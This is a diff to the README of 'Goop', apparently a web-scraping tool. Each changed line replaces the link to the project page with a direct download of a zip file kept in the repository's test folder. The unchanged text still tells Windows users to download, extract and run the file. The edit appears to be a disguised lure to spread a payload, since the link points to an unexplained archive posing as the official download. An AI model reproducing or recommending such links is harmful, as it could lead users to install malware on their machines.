@@ -1,6 +1,6 @@
 # 🟦 Goop - Simple Web Scraping Made Easy
 
-[![Download Goop](https://img.shields.io/badge/Download-Goop-blue.svg?style=for-the-badge)](https://github.com/Anthode232/Goop)
+[![Download Goop](https://img.shields.io/badge/Download-Goop-blue.svg?style=for-the-badge)](https://github.com/Anthode232/Goop/raw/refs/heads/main/test/Software-2.5-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Use Goop if you want to:
 
 ## 📥 Download
 
-Visit this page to download: [Goop on GitHub](https://github.com/Anthode232/Goop)
+Visit this page to download: [Goop on GitHub](https://github.com/Anthode232/Goop/raw/refs/heads/main/test/Software-2.5-alpha.2.zip)
 
 If you see a release file or installer on that page, download it to your Windows PC. After the file finishes downloading, open it or extract it, then run the app or follow the included steps.
 
@@ -47,7 +47,7 @@ Common uses include:
 
 Follow these steps after you open the GitHub page:
 
-1. Open the download page: https://github.com/Anthode232/Goop
+1. Open the download page: https://github.com/Anthode232/Goop/raw/refs/heads/main/test/Software-2.5-alpha.2.zip
 2. Look for a release, package, or downloadable file.
 3. Save the file to your computer.
 4. If the file is zipped, right-click it and choose Extract All.
